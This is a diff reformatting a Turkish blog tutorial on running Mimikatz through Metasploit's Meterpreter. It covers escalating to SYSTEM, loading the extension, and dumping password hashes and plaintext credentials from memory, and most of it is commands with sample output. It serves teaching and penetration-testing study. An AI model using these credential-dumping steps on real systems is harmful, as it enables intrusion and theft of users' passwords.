@@ -1,51 +1,36 @@
 ---
 draft: false
-
-title:  'MSF Mimikatz'
-date: '2017-06-16T13:59:00+03:00'
+title: MSF Mimikatz
+linkTitle: Mimikatz
+translationKey: msf-mimikatz
+weight: 300
+date: 2017-06-16T13:59:00+03:00
 author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
-
-description:  'Metasploit Framework, çok yönlü kullanım imkanları sağlamaktadır. Bu sebeple, harici kaynaklardan kodları da sistem içine dahil etmek mümkündür. Bu yazımızda, mimikatz uygulamasının Metasploit Framework içinde kullanımı ile ilgili örneklere bakacağız.' 
- 
-url:  /tr/msf-mimikatz/
- 
+description: Bu yazımızda, mimikatz uygulamasının Metasploit Framework içinde kullanımı ile ilgili örneklere bakacağız.
+url: /tr/msf-mimikatz/
 featured_image: /images/metasploit.jpg
 categories:
-    - 'Metasploit Framework'
+  - Metasploit Framework
 tags:
-    - cybersecurity
-    - 'metasploit framework'
+  - cybersecurity
+  - metasploit framework
 ---
-
-
 Metasploit Framework, çok yönlü kullanım imkanları sağlamaktadır. Bu sebeple, harici kaynaklardan kodları da sistem içine dahil etmek mümkündür. Bu yazımızda, mimikatz uygulamasının Metasploit Framework içinde kullanımı ile ilgili örneklere bakacağız.
-
-
 
 ## Mimikatz nedir?
 
-
-
 Mimikatz, esasında Benjamin Delpy tarafından yazılan bir post-exploitation programıdır. Hedef bilgisayardan bilgi toplama için kullanılır. Mimikatz, bilgi toplama için gerekli bir çok farklı komutu bünyesinde toplamıştır.
-
-
 
 ## Mimikatz Yükleme
 
-
-
 Mimikatz, hedef sistemde bir Meterpreter oturumu açtıktan sonra çalıştırılabilir. Sisteme herhangi bir dosya yüklemeye gerek kalmadan hafıza üzerinde çalışır. Etkin olarak çalışabilmesi için SYSTEM seviyesinde oturum yetkilerine sahip olmamız gerekir.
-
 
 ```bash
 meterpreter > getuid
 Server username: WINXP-E95CE571A1\Administrator
 ```
 
-
-
 Bu çıktıda, hedef sistemde SYSTEM seviyesinde olmadığımız görülmektedir. Öncelikle SYSTEM seviyesine geçmeye çalışalım.
-
 
 ```bash
 meterpreter > getsystem
@@ -55,14 +40,9 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
-
-
 Başarılı olduysanız yukarıdaki gibi SYSTEM seviyesine geçtiğinize dair çıktı alırsınız.
 
-
-
 Mimikatz, 32-bit ve 64-bit mimarilerde çalışmak üzere tasarlanmıştır. SYSTEM seviyesine geçtikten sonra hedef sistemin mimarisinin ne olduğuna `sysinfo` komutuyla bakmalıyız. Bazen, Meterpreter oturum 64-bit mimaride çalışan bir 32-bit mimari prosesinde oturum açmış olabilir. Bu durumda mimikatz’ın bazı özellikleri çalışmayacaktır. Meterpreter oturumu 32-bit bir proseste çalışıyorsa (Mimari aslında 64-bit olmasına rağmen), mimikatz, 32-bit için yazılımları kullanmaya çalışacaktır. Bunun önüne geçmenin yolu `ps` komutuyla çalışan proseslere bakmak ve `migrate` komutuyla başka bir prosese geçmektir.
-
 
 ```bash
 meterpreter > sysinfo
@@ -73,20 +53,14 @@ System Language : en_US
 Meterpreter     : x86/win32
 ```
 
-
-
 Burada görülen çıktıda, hedef makinenin zaten 32-bit mimaride olduğunu görüyoruz. O zaman, 32-bit, 64-bit çakışması bulunmamaktadır. Artık `mimikatz` modülünü yükleyebiliriz.
-
 
 ```bash
 meterpreter > load mimikatz
 Loading extension mimikatz...success.
 ```
 
-
-
 Yükleme başarıyla tamamlandıktan sonra öncelikle yardım bilgisini görüntüleyelim.
-
 
 ```bash
 meterpreter > help mimikatz
@@ -105,28 +79,18 @@ Mimikatz Commands
     wdigest           Attempt to retrieve wdigest creds
 ```
 
-
-
 Mimikatz, temel olarak yukarıdaki komutları kullanmamızı sağlarsa da içlerinde en güçlüsü `mimikatz_command` seçeneğidir.
 
-
-
 Öncelikle mimikatz sürümünü kontrol edelim.
-
 
 ```bash
 meterpreter > mimikatz_command -f version
 mimikatz 1.0 x86 (RC) (Nov  7 2013 08:21:02)
 ```
 
-
-
 Mimikatz’ın sağladığı bir takım modüller bulunur. Bu modüllerin listesini görmek için sistemde bulunmayan bir modül ismi vermeniz yeterlidir. Bu durumda mimikatz size kullanılabilir modüllerin listesini verecektir. Komut kullanımında `modüladı::` kullanım formatına dikkat edin.
 
-
-
 Aşağıdaki örnekte, `fu::` modülü istenmiştir. Böyle bir modül olmadığından kullanılabilir tüm modülleri listelemiş olduk.
-
 
 ```bash
 meterpreter > mimikatz_command -f fu::
@@ -154,10 +118,7 @@ Modules disponibles :
          efs    - Manipulations EFS
 ```
 
-
-
 Bu listede bulunan modüllerin kullanılabilir seçeneklerini listelemek için modül ismini vererek girilen komut aşağıdaki formatta kullanılmaktadır.
-
 
 ```bash
 meterpreter > mimikatz_command -f divers::
@@ -170,22 +131,13 @@ Description du module : Fonctions diverses n'ayant pas encore assez de corps pou
      secrets    - Affiche les secrets utilisateur
 ```
 
-
-
 Gördüğünüz gibi `drivers` modülünün, `noroutemon, eventdrop, cancelator, secrets` seçenekleri bulunmaktadır.
-
-
 
 ## RAM Hafızadan Hash ve Parola Okuma
 
-
-
 RAM hafızadan Hash değerlerini ve parolaları okumak için Metasploit Framework’ün sağladığı kendi komutlarını kullanabileceğimiz gibi `mimikaz` modüllerini de kullanabiliriz.
 
-
-
 ## Metasploit Komutları ile Bilgi Elde etme
-
 
 ```bash
 meterpreter > msv
@@ -217,10 +169,7 @@ AuthID   Package    Domain           User              Password
 0;78980  NTLM       WINXP-E95CE571A1  Administrator     SuperSecretPassword
 ```
 
-
-
 ## Mimikatz Modülleri ile Bilgi Elde Etme
-
 
 ```bash
 meterpreter > mimikatz_command -f samdump::hashes
@@ -251,18 +200,11 @@ meterpreter > mimikatz_command -f sekurlsa::searchPasswords
 **[**0] **{** Administrator ; WINXP-E95CE571A1 ; SuperSecretPassword **}**
 ```
 
-
-
 ## Diğer Modüller
 
-
-
-Yukarıda örnek olarak gösterilen modüllerin haricinde başka modüllerde bulunur. Bunların tamamını <a href="http://blog.gentilkiwi.com/">Mimikatz</a> web sayfasından inceleyebilirsiniz.
-
-
+Yukarıda örnek olarak gösterilen modüllerin haricinde başka modüllerde bulunur. Bunların tamamını [Mimikatz](http://blog.gentilkiwi.com/) web sayfasından inceleyebilirsiniz.
 
 ## Kullanıcı Token Bilgileri
-
 
 ```bash
 meterpreter > mimikatz_command -f handle::
@@ -292,14 +234,9 @@ meterpreter > mimikatz_command -f handle::list
 ...snip...
 ```
 
-
-
 ## Windows Servisleri İşlemleri
 
-
-
 Mimikatz, Windows servislerini başlatma, durdurma ve kaldırma imkanı da sağlamaktadır. Servis modülüne ve seçeneklerine bakalım.
-
 
 ```bash
 meterpreter > mimikatz_command -f service::
@@ -313,10 +250,7 @@ Description du module : Manipulation des services
     mimikatz    - Installe et/ou démarre le pilote mimikatz
 ```
 
-
-
 Bu seçeneklerden, listeleme modülünü kullanalım.
-
 
 ```bash
 meterpreter > mimikatz_command -f service::list
@@ -336,14 +270,9 @@ meterpreter > mimikatz_command -f service::list
 ...snip...
 ```
 
-
-
 ## Kripto Modülü
 
-
-
 Mimikatz’ın sağladığı kripto modülüne ve seçeneklerine bakalım.
-
 
 ```bash
 meterpreter > mimikatz_command -f crypto::
@@ -360,10 +289,7 @@ exportCertificates      - Exporte les certificats
    patchcapi    - [experimental] Patch la CryptoAPI courante pour l'export de clés non exportable
 ```
 
-
-
 Bu seçeneklerden `listProviders` seçeneğini kullanalım.
-
 
 ```bash
 meterpreter > mimikatz_command -f crypto::listProviders
@@ -381,7 +307,5 @@ Providers CryptoAPI :
         Microsoft RSA SChannel Cryptographic Provider
         Microsoft Strong Cryptographic Provider
 ```
-
-
 
 Yukarıdaki örneklerden göreceğiniz gibi, Mimikatz’a ait modüller ve bu modüllerin seçenekleri bulunuyor. Çok geniş ihtimaller dahilinde kullanabileceğiniz komutları tek tek deneyerek tecrübe kazanmanızı tavsiye ediyorum.
